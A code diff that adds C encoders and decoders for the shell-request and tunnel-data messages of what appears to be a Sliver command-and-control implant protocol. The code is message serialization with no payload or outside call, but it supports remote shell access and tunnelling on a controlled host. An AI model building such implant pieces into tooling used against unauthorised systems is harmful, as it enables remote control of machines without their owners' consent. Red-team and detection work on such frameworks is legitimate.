@@ -893,3 +893,121 @@ int sliver_execute_encode(sliver_buf_t *out, uint32_t status, const void *stdout
   }
   return encode_response(out, err);
 }
+
+/* --- Shell / Tunnel ----------------------------------------------------- */
+
+int sliver_shell_req_decode(const void *data, size_t len, sliver_shell_req_t *out) {
+  sliver_reader_t r;
+  uint32_t field, wire;
+  int rc;
+
+  if (out == NULL) {
+    return -1;
+  }
+  memset(out, 0, sizeof(*out));
+  sliver_reader_init(&r, data, len);
+  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
+    if (field == 1 && wire == 2) {
+      if (sliver_reader_string(&r, out->path, sizeof(out->path)) != 0) {
+        return -1;
+      }
+    } else if (wire == 0 && (field == 2 || field == 3 || field == 4 || field == 5 || field == 8)) {
+      uint64_t v;
+      if (sliver_reader_varint(&r, &v) != 0) {
+        return -1;
+      }
+      if (field == 2) {
+        out->enable_pty = v != 0;
+      } else if (field == 3) {
+        out->pid = (uint32_t)v;
+      } else if (field == 4) {
+        out->rows = (uint32_t)v;
+      } else if (field == 5) {
+        out->cols = (uint32_t)v;
+      } else {
+        out->tunnel_id = v;
+      }
+    } else if (sliver_reader_skip(&r, wire) != 0) {
+      return -1;
+    }
+  }
+  return rc == 1 ? 0 : -1;
+}
+
+int sliver_shell_encode(sliver_buf_t *out, const char *path, int pty, uint32_t pid,
+                        uint64_t tunnel_id, const char *err) {
+  if (out == NULL) {
+    return -1;
+  }
+  if (sliver_buf_put_string(out, 1, path != NULL ? path : "") != 0) {
+    return -1;
+  }
+  if (pty && sliver_buf_put_bool(out, 2, 1) != 0) {
+    return -1;
+  }
+  if (sliver_buf_put_uint32(out, 3, pid) != 0) {
+    return -1;
+  }
+  if (tunnel_id != 0 && sliver_buf_put_uint64(out, 8, tunnel_id) != 0) {
+    return -1;
+  }
+  return encode_response(out, err);
+}
+
+int sliver_tunnel_data_decode(const void *data, size_t len, sliver_tunnel_data_t *out) {
+  sliver_reader_t r;
+  uint32_t field, wire;
+  int rc;
+
+  if (out == NULL) {
+    return -1;
+  }
+  memset(out, 0, sizeof(*out));
+  sliver_reader_init(&r, data, len);
+  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
+    if (field == 1 && wire == 2) {
+      const uint8_t *p;
+      size_t n;
+      if (sliver_reader_bytes(&r, &p, &n) != 0) {
+        return -1;
+      }
+      out->data = p;
+      out->data_len = n;
+    } else if (wire == 0 && (field == 2 || field == 3 || field == 4 || field == 8)) {
+      uint64_t v;
+      if (sliver_reader_varint(&r, &v) != 0) {
+        return -1;
+      }
+      if (field == 2) {
+        out->closed = v != 0;
+      } else if (field == 3) {
+        out->sequence = v;
+      } else if (field == 4) {
+        out->ack = v;
+      } else {
+        out->tunnel_id = v;
+      }
+    } else if (sliver_reader_skip(&r, wire) != 0) {
+      return -1;
+    }
+  }
+  return rc == 1 ? 0 : -1;
+}
+
+int sliver_tunnel_data_encode(sliver_buf_t *out, const void *payload, size_t payload_len,
+                              int closed, uint64_t sequence, uint64_t tunnel_id) {
+  if (out == NULL) {
+    return -1;
+  }
+  if (payload != NULL && payload_len != 0 &&
+      sliver_buf_put_bytes(out, 1, payload, payload_len) != 0) {
+    return -1;
+  }
+  if (closed && sliver_buf_put_bool(out, 2, 1) != 0) {
+    return -1;
+  }
+  if (sequence != 0 && sliver_buf_put_uint64(out, 3, sequence) != 0) {
+    return -1;
+  }
+  return sliver_buf_put_uint64(out, 8, tunnel_id);
+}
